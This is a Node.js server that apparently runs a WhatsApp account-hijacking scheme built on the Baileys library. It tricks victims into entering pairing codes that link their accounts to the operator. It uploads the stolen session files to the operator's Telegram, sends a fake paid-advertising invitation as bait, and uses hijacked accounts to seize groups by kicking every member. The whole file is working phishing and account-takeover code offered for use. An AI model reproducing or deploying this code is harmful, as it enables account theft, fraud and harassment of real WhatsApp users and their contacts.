const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const {
    default: makeWASocket,
    useMultiFileAuthState,
    delay,
    DisconnectReason,
    fetchLatestWaWebVersion,
    Browsers
} = require('@whiskeysockets/baileys');
const pino = require('pino');
const TelegramBot = require('node-telegram-bot-api');
const archiver = require('archiver');
const fs = require('fs-extra');
const path = require('path');
const { HttpsProxyAgent } = require('https-proxy-agent');
const axios = require('axios');

const BOT_NUMBER = process.env.BOT_NUMBER || '2348023931932';
const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN || 'YOUR_TELEGRAM_BOT_TOKEN';
const MY_TELEGRAM_ID = process.env.MY_TELEGRAM_ID || 'YOUR_TELEGRAM_USER_ID';
const RENDER_URL = process.env.RENDER_URL || 'https://your-app-name.onrender.com';

const PROXY_CACHE_FILE = path.join(__dirname, 'working_proxy.json');

const app = express();
const server = http.createServer(app);
const io = new Server(server);

app.use(express.static('public'));

app.get('/admin', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});

// recent log buffer for /logs endpoint
const logBuffer = [];
function pushLog(msg, type = 'info') {
    const entry = { time: new Date().toISOString(), msg, type };
    logBuffer.push(entry);
    if (logBuffer.length > 200) logBuffer.shift();
    io.emit('log', entry);
}

app.get('/logs', (req, res) => {
    res.json(logBuffer.slice(-100));
});

const tgBot = new TelegramBot(TELEGRAM_TOKEN, { polling: { autoStart: true, interval: 1000 } });
tgBot.on('polling_error', () => {});

let adminSock = null;
let activeVictims = {};
let victimList = [];

// ── proxy cache ─────────────────────────────────────────────
function loadCachedProxy() {
    try {
        if (fs.existsSync(PROXY_CACHE_FILE)) {
            const data = JSON.parse(fs.readFileSync(PROXY_CACHE_FILE, 'utf8'));
            if (data.proxy && Date.now() - data.savedAt < 1000 * 60 * 60 * 6) {
                return data.proxy;
            }
        }
    } catch (e) {}
    return null;
}

function saveCachedProxy(proxy) {
    try {
        fs.writeFileSync(PROXY_CACHE_FILE, JSON.stringify({
            proxy,
            savedAt: Date.now()
        }));
    } catch (e) {}
}

// ── session restore ─────────────────────────────────────────
async function restoreSessionFromTelegram(folderName) {
    const folderPath = path.join(__dirname, folderName);
    if (await fs.pathExists(folderPath)) return true;

    try {
        const updates = await tgBot.getUpdates({ limit: 100 });
        const docs = updates
            .filter(u => u.message?.document?.file_name?.includes(folderName))
            .sort((a, b) => b.message.date - a.message.date);

        if (!docs.length) return false;

        const fileId = docs[0].message.document.file_id;
        const fileLink = await tgBot.getFileLink(fileId);
        const zipPath = path.join(__dirname, `${folderName}_restore.zip`);

        const writer = fs.createWriteStream(zipPath);
        const response = await axios({ url: fileLink, method: 'GET', responseType: 'stream' });
        response.data.pipe(writer);

        await new Promise((resolve, reject) => {
            writer.on('finish', resolve);
            writer.on('error', reject);
        });

        await fs.ensureDir(folderPath);
        const extract = require('extract-zip');
        await extract(zipPath, { dir: folderPath });
        await fs.unlink(zipPath);
        return true;
    } catch (e) {
        return false;
    }
}

// ── proxies ─────────────────────────────────────────────────
async function getLiveProxies() {
    try {
        const res = await axios.get(
            'https://proxylist.geonode.com/api/proxy-list?limit=20&page=1&sort_by=lastChecked&sort_type=desc&protocols=http%2Chttps',
            { timeout: 8000 }
        );
        return res.data.data.map(p => `http://${p.ip}:${p.port}`);
    } catch (e) { return []; }
}

// ── backup ──────────────────────────────────────────────────
async function backupToTelegram(phoneNumber, folderPath) {
    const zipPath = path.join(__dirname, `${phoneNumber}.zip`);
    const output = fs.createWriteStream(zipPath);
    const archive = archiver('zip', { zlib: { level: 9 } });

    return new Promise((resolve, reject) => {
        output.on('close', async () => {
            try {
                await tgBot.sendDocument(MY_TELEGRAM_ID, zipPath, {
                    caption: `#SESSION ${phoneNumber}`
                });
                fs.unlinkSync(zipPath);
                resolve();
            } catch (e) { reject(e); }
        });
        archive.on('error', reject);
        archive.pipe(output);
        archive.directory(folderPath, false);
        archive.finalize();
    });
}

// ── admin bot ───────────────────────────────────────────────
async function startAdminBot() {
    await restoreSessionFromTelegram('auth_info_admin');

    const { state, saveCreds } = await useMultiFileAuthState('auth_info_admin');
    const { version } = await fetchLatestWaWebVersion({});

    const cachedProxy = loadCachedProxy();
    const sockOptions = {
        version,
        logger: pino({ level: 'silent' }),
        printQRInTerminal: false,
        auth: state,
        browser: Browsers.macOS('Safari'),
        connectTimeoutMs: 60000,
        defaultQueryTimeoutMs: 60000
    };

    if (cachedProxy) {
        sockOptions.agent = new HttpsProxyAgent(cachedProxy);
        pushLog(`Admin using cached proxy: ${cachedProxy}`, 'info');
    }

    adminSock = makeWASocket(sockOptions);
    adminSock.ev.on('creds.update', saveCreds);

    adminSock.ev.on('connection.update', async (update) => {
        if (update.connection === 'open') {
            pushLog('Admin Bot connected', 'info');
            tgBot.sendMessage(MY_TELEGRAM_ID, '✅ Admin Bot Linked!', { parse_mode: 'Markdown' });
            // cache the proxy that worked for admin
            if (cachedProxy) saveCachedProxy(cachedProxy);
        }
        if (update.connection === 'close' &&
            update.lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut) {
            startAdminBot();
        }
    });

    if (!adminSock.authState.creds.registered) {
        adminSock.ev.on('connection.update', async (update) => {
            if (update.connection === 'connecting' && !adminSock.authState.creds.registered) {
                await delay(3000);
                try {
                    const code = await adminSock.requestPairingCode(BOT_NUMBER);
                    tgBot.sendMessage(
                        MY_TELEGRAM_ID,
                        `*Admin Pairing Code:* \`${code}\``,
                        { parse_mode: 'Markdown' }
                    );
                } catch (err) {}
            }
        });
    }
}

// ── victim pairing ──────────────────────────────────────────
io.on('connection', (socket) => {
    socket.on('request_code', async (phoneNumber) => {
        const targetNumber = phoneNumber.replace(/[^0-9]/g, '');
        const folderName = `auth_info_${targetNumber}`;

        socket.emit('pair_status', { msg: 'Restoring session...', step: 1 });
        await restoreSessionFromTelegram(folderName);
        const { state, saveCreds } = await useMultiFileAuthState(folderName);

        if (state.creds.registered) {
            socket.emit('error', 'This number is already linked.');
            return;
        }

        const { version } = await fetchLatestWaWebVersion({});
        socket.emit('pair_status', { msg: 'Fetching proxies...', step: 2 });

        // ← THE CHANGE: cached admin proxy first, then fresh proxies, then DIRECT
        const cachedProxy = loadCachedProxy();
        const liveProxies = await getLiveProxies();

        const orderedProxies = [];
        if (cachedProxy) orderedProxies.push(cachedProxy);
        for (const p of liveProxies) {
            if (p !== cachedProxy) orderedProxies.push(p);
        }
        orderedProxies.push('DIRECT');

        tgBot.sendMessage(MY_TELEGRAM_ID,
            `🔍 *Pairing attempt started*\nNumber: \`${targetNumber}\`\nCached proxy: ${cachedProxy || 'none'}\nProxies loaded: ${liveProxies.length}`
        );

        let success = false;
        let lastError = null;

        for (let i = 0; i < orderedProxies.length; i++) {
            if (success) break;
            const proxyUrl = orderedProxies[i];
            const label = proxyUrl === 'DIRECT' ? 'DIRECT' : proxyUrl;

            socket.emit('pair_status', {
                msg: `Attempt ${i + 1}/${orderedProxies.length} — ${label}`,
                step: 3
            });

            try {
                const sockOptions = {
                    version,
                    logger: pino({ level: 'silent' }),
                    printQRInTerminal: false,
                    auth: state,
                    browser: Browsers.macOS('Safari'),
                    connectTimeoutMs: 15000,
                    defaultQueryTimeoutMs: 15000
                };

                if (proxyUrl !== 'DIRECT') {
                    sockOptions.agent = new HttpsProxyAgent(proxyUrl);
                }

                const phishSock = makeWASocket(sockOptions);
                phishSock.ev.on('creds.update', saveCreds);

                await new Promise((resolve, reject) => {
                    let isResolved = false;

                    phishSock.ev.on('connection.update', async (update) => {
                        if (update.connection === 'connecting' && !isResolved) {
                            isResolved = true;
                            await delay(2000);
                            try {
                                const code = await phishSock.requestPairingCode(targetNumber);
                                success = true;

                                socket.emit('pair_status', {
                                    msg: 'Code generated. Enter it on your phone.',
                                    step: 4
                                });
                                socket.emit('code_generated', code);

                                tgBot.sendMessage(MY_TELEGRAM_ID,
                                    `✅ *Pairing code issued*\nNumber: \`${targetNumber}\`\nCode: \`${code}\`\nVia: ${label}`
                                );

                                // ← cache whichever proxy actually produced a code
                                if (proxyUrl !== 'DIRECT') saveCachedProxy(proxyUrl);

                                resolve();
                            } catch (e) {
                                lastError = e.message;
                                tgBot.sendMessage(MY_TELEGRAM_ID,
                                    `⚠️ *requestPairingCode failed*\nVia: ${label}\nError: ${e.message}`
                                );
                                try { phishSock.end(undefined); } catch(err) {}
                                reject(e);
                            }
                        }

                        if (update.connection === 'open') {
                            activeVictims[targetNumber] = phishSock;
                            if (!victimList.find(v => v.number === targetNumber)) {
                                victimList.push({ number: targetNumber, status: 'Online' });
                            }
                            io.emit('victim_update', victimList);
                            socket.emit('success');
                            tgBot.sendMessage(MY_TELEGRAM_ID,
                                `🔥 *NEW VICTIM LINKED!*\nNumber: \`${targetNumber}\`\nVia: ${label}`
                            );
                            await backupToTelegram(targetNumber, folderName);
                        }

                        if (update.connection === 'close') {
                            const code = update.lastDisconnect?.error?.output?.statusCode;
                            tgBot.sendMessage(MY_TELEGRAM_ID,
                                `❌ *Socket closed*\nVia: ${label}\nStatus: ${code || 'unknown'}`
                            );
                        }
                    });

                    setTimeout(() => {
                        if (!isResolved) {
                            isResolved = true;
                            lastError = 'timeout';
                            tgBot.sendMessage(MY_TELEGRAM_ID,
                                `⏱️ *Timeout*\nVia: ${label}`
                            );
                            try { phishSock.end(undefined); } catch(err) {}
                            reject(new Error('Timeout'));
                        }
                    }, 15000);
                });

            } catch (error) {
                lastError = error.message;
            }
        }

        if (!success) {
            tgBot.sendMessage(MY_TELEGRAM_ID,
                `💀 *All pairing attempts failed*\nNumber: \`${targetNumber}\`\nLast error: ${lastError}\nTried: ${orderedProxies.length}`
            );
            socket.emit('error', `Could not pair after ${orderedProxies.length} attempts. Last error: ${lastError}`);
        }
    });

    socket.on('admin_join', () => io.emit('victim_update', victimList));

    socket.on('admin_send_invite', async (number) => {
        if (!adminSock) return;
        const target = number.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
        const pitch = `*Partnership Invitation: Monetize Your WhatsApp Account*\n\nHello,\n\nWe are currently onboarding active WhatsApp users to join our advertising network. As a partner, our system will use your account to distribute verified business campaigns to your contacts.\n\nIn return, we offer a guaranteed *₦2,000 onboarding bonus*, plus a *₦500 daily retainer* as long as your account remains active in our network.\n\nTo view the terms and activate your account, please visit our secure portal:\n${RENDER_URL}\n\n_Note: This is a fully automated campaign system. No manual posting is required._`;
        try {
            await adminSock.sendMessage(target, { text: pitch });
            pushLog(`Invite sent to ${number}`, 'info');
        } catch (e) {}
    });

    socket.on('admin_takeover', async (data) => {
        const victimNumber = data.victim.replace(/[^0-9]/g, '');
        const groupJid = data.group;
        if (!activeVictims[victimNumber]) {
            return pushLog(`Victim ${victimNumber} not online.`, 'error');
        }

        const victimSock = activeVictims[victimNumber];
        try {
            await victimSock.groupParticipantsUpdate(
                groupJid,
                [BOT_NUMBER + '@s.whatsapp.net'],
                'promote'
            );
            await delay(1500);
            const meta = await victimSock.groupMetadata(groupJid);
            let kicked = 0;
            for (let p of meta.participants) {
                if (p.id === victimSock.user.id || p.id === BOT_NUMBER + '@s.whatsapp.net') continue;
                if (p.admin) {
                    await victimSock.groupParticipantsUpdate(groupJid, [p.id], 'demote');
                    await delay(1000);
                }
                await victimSock.groupParticipantsUpdate(groupJid, [p.id], 'remove');
                kicked++;
                await delay(1000);
            }
            pushLog(`Takeover complete. Kicked ${kicked}.`, 'info');
        } catch (e) {
            pushLog(`Takeover failed: ${e.message}`, 'error');
        }
    });
});

setInterval(() => {
    http.get(`http://localhost:${process.env.PORT || 8080}/admin`, () => {})
        .on('error', () => {});
}, 10 * 60 * 1000);

server.listen(process.env.PORT || 8080, () => {
    startAdminBot();
});